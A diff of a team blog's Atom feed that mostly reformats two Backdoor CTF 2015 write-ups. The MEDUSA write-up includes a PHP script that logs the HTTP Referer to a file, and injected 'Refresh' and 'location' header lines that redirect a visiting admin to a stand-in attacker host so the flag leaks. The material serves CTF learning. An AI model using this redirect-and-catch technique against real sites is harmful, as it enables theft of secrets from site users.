@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T01:14:17+04:30</updated>
+  <updated>2015-04-03T01:30:40+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -29,6 +29,9 @@ You can enter a fake flag to simulate the challenge.</p>
 <p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>
 
 <p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>
+
+<!-- more -->
+
 
 <p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>
 
@@ -58,46 +61,42 @@ Server.php</p>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
 </span><span class='line'>$ref = $_SERVER['HTTP_REFERER'];
 </span><span class='line'>file_put_contents("flag.txt",$ref);
-</span><span class='line'>?&gt;```
-</span><span class='line'>
-</span><span class='line'> &gt; and sent this code as our page to Medusa form :</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>
 
 
-<hr />
-
-<h2>location: <a href="http://Attackerwebsite.com/server.php">http://Attackerwebsite.com/server.php</a></h2>
-
-<p>Can you get the <strong>flag</strong>?</p>
+<blockquote><p>and sent this code as our page to Medusa form :</p></blockquote>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>but after admin visit the link flag.txt is empty !!!
-</span><span class='line'>
-</span><span class='line'>no Referer sent to PHP page...
-</span><span class='line'>
-</span><span class='line'>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt
-</span><span class='line'>
-</span><span class='line'>after some research we found out with this kind of header redirection we cant get Referer and we should change that.
+</pre></td><td class='code'><pre><code class=''><span class='line'>---
+</span><span class='line'>location: http://Attackerwebsite.com/server.php
+</span><span class='line'>---
+</span><span class='line'>Can you get the **flag**?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>but after admin visit the link flag.txt is empty !!!</p>
+
+<p>no Referer sent to PHP page&hellip;</p>
+
+<p>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt</p>
+
+<p>after some research we found out with this kind of header redirection we cant get Referer and we should change that.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---
+</span><span class='line'>Refresh: 0; url=http://Attackerwebsite.com/server.php
+</span><span class='line'>---
+</span><span class='line'>Can you get the **flag**?
 </span></code></pre></td></tr></table></div></figure>
 
-
-<hr />
-
-<h2>Refresh: 0; url=<a href="http://Attackerwebsite.com/server.php">http://Attackerwebsite.com/server.php</a></h2>
-
-<p>Can you get the <strong>flag</strong>?</p>
-
-<p>&#8220;`</p>
 
 <p>and guess what?</p>
 
@@ -116,9 +115,8 @@ Server.php</p>
     <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
     <updated>2015-04-03T00:42:36+04:30</updated>
     <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
-    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong></p>
-
-<p><strong>Point = 200</strong><br/>
+    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong><br/>
+<strong>Point = 200</strong><br/>
 <strong>Category = Exploit</strong><br/>
 <strong>Description : </strong></p>
 
@@ -130,8 +128,12 @@ Submit sha-256 of secret and flag joined
 Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
 Submit sha-256 of secret and flag joined</p></blockquote>
 
-<p>We could see  see an intrepreter like this :
-<img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
+<p>We could see  see an intrepreter like this :</p>
+
+<!-- more -->
+
+
+<p><img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
 so first for testing script give &ldquo;1&rdquo; as input it will retrun &ldquo;1&rdquo; again ..
 lets check whats going on in browser run firebug and check :</p>
 
